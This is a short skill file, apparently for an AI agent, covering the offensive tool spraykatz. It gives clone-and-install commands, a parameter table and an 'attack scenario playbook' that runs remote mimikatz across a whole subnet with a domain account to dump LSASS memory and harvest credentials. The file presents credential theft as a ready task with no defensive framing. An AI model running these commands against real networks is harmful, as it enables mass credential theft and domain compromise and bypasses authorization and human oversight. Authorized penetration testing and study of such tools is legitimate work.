---
name: spraykatz-credentials
description: "spraykatz runs remote mimikatz in domain. Signals: memory dump, lsass, remote credential harvesting, wordlist"
zh-signals: "spraykatz: 域内远程 mimikatz。信号:内存转储,lsass,远程凭据收割,wordlist。"
when-to-use: >-
  Use in a domain environment when you have a valid account and want to batch
  remote mimikatz against many hosts over a CIDR to harvest credentials from
  LSASS.
---

# spraykatz

- Attack Category: C24 Memory Dumping and LSASS Theft
- Upstream Repository: https://github.com/aas-n/spraykatz
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/aas-n/spraykatz && cd spraykatz && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 spraykatz.py -u admin -p pass -t 10.0.0.0/24` | Remote credential harvesting |
| `-t cidr -u u -p p` | Credentials |
| `-w` | wordlist |

## Attack Scenario Playbook

### Remote Mimikatz in the Domain

```bash
python3 spraykatz.py -u svc -p pass -t 10.0.0.0/24
# batch remote lsass dump
```

## Notes

Remote batch Mimikatz.
